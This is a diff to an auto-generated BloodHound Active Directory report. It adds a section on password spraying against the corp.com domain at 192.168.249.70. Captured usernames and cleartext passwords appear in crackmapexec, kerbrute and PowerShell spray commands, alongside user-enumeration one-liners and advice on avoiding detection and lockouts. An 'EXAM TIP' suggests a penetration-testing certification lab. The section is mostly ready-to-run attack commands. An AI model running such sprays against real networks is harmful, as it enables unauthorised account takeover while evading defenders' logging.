@@ -1,6 +1,6 @@
 # BloodHound Enhanced Report
 
-**Generated:** 2025-12-03 15:00:57
+**Generated:** 2025-12-03 16:39:32
 
 ---
 
@@ -1095,3 +1095,109 @@ Replace placeholders with your credentials:
 | Password Policy | `crackmapexec smb <DC_IP> -u <USERNAME> -p '<PASSWORD>' --pass-pol` |
 | Domain Trust Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_trusts` |
 | GPO Enumeration | `crackmapexec ldap <DC_IP> -u <USERNAME> -p '<PASSWORD>' -M enum_gpo` |
+
+
+## Password Spraying Methods
+
+*Based on captured credentials: IIS_SERVICE, DAVE, LEON*
+
+### Password Policy
+
+| Setting | Value |
+|---------|-------|
+| Lockout threshold | 5 attempts |
+| Lockout duration | 30 minutes |
+| Observation window | 30 minutes |
+
+**Safe Spray Parameters:**
+- Attempts per round: **4**
+- Delay between: **30 minutes**
+
+### Spray Methods
+
+#### METHOD 1: SMB-Based Spray (crackmapexec/netexec)
+*Ports: 445 | Noise: HIGH*
+
+```bash
+crackmapexec smb 192.168.249.70 -u users.txt -p 'Strawberry1' -d corp.com --continue-on-success
+crackmapexec smb 192.168.249.70 -u users.txt -p 'Flowers1' -d corp.com --continue-on-success
+crackmapexec smb 192.168.249.70 -u users.txt -p 'HomeTaping199!' -d corp.com --continue-on-success
+```
+
+- **+** Shows admin access (Pwn3d!), validates creds + checks admin in one step
+- **-** Very noisy (Event logs 4625), triggers lockouts, detected by EDR
+
+#### METHOD 2: Kerberos TGT-Based Spray (kerbrute)
+*Ports: 88 | Noise: LOW*
+
+```bash
+kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt 'Strawberry1'
+kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt 'Flowers1'
+kerbrute passwordspray -d corp.com --dc 192.168.249.70 users.txt 'HomeTaping199!'
+```
+
+- **+** Fastest, stealthiest - only 2 UDP frames per attempt, pre-auth check avoids lockouts for invalid users
+- **-** No admin check (just validates creds), requires valid userlist, Kerberos only
+
+#### METHOD 3: LDAP/ADSI-Based Spray (PowerShell)
+*Ports: 389, 636 | Noise: MEDIUM*
+
+```bash
+Invoke-DomainPasswordSpray -UserList users.txt -Password 'Strawberry1' -Verbose
+```
+
+- **+** Built into Windows - no external tools needed, uses native APIs, scriptable
+- **-** Windows-only, slower than Kerberos, requires PowerShell access on target
+
+### User List Generation
+
+**From Linux (Kali):**
+
+```bash
+# Enumerate valid users via Kerberos pre-auth
+kerbrute userenum -d corp.com --dc 192.168.249.70 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt && cut -d' ' -f8 valid_users.txt | cut -d'@' -f1 > users.txt
+```
+
+```bash
+# CME user enumeration (authenticated)
+crackmapexec smb 192.168.249.70 -u 'IIS_SERVICE' -p 'Strawberry1' -d corp.com --users | awk '{print $5}' | grep -v '\[' > users.txt
+```
+
+```bash
+# Export users from BloodHound Neo4j (clean output)
+echo "MATCH (u:User) WHERE u.name IS NOT NULL AND NOT u.name STARTS WITH 'NT AUTHORITY' RETURN u.samaccountname" | cypher-shell -u neo4j -p '<NEO4J_PASS>' --format plain | tail -n +2 | sed 's/"//g' | grep -v '^$' > users.txt
+```
+
+**From Windows (on target):**
+
+```powershell
+# Export domain users to file
+net user /domain > users.txt
+```
+
+```powershell
+# PowerShell AD enumeration (requires RSAT)
+Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > users.txt
+```
+
+### Scenario Recommendations
+
+| Scenario | Method | Reason |
+|----------|--------|--------|
+| Stealth required (avoid detection) | **kerberos** | Kerbrute doesn't generate Windows Event Logs for failed auth |
+| Need to identify admin access | **smb** | CME shows (Pwn3d!) for admin access, validates + checks in one step |
+| Large user list (1000+ users) | **kerberos** | Fastest option - only 2 UDP frames per attempt |
+| Windows-only environment (no tool transfer) | **ldap** | Uses built-in PowerShell, no binary transfer needed |
+| Strict lockout policy (threshold <= 3) | **kerberos** | Pre-auth check identifies invalid users without incrementing lockout counter |
+| Need to spray entire subnet | **smb** | CME supports CIDR ranges, shows which hosts are accessible |
+
+### Quick Reference
+
+| Method | Noise | Speed | Admin Check |
+|--------|-------|-------|-------------|
+| SMB (CME) | HIGH | Medium | YES |
+| Kerberos | LOW | Fast | No |
+| LDAP/ADSI | MEDIUM | Slow | No |
+
+> **EXAM TIP:** Before spraying, always check `net accounts` to verify lockout.
+> With 5-attempt lockout, safely attempt 4 passwords per 30 min window.
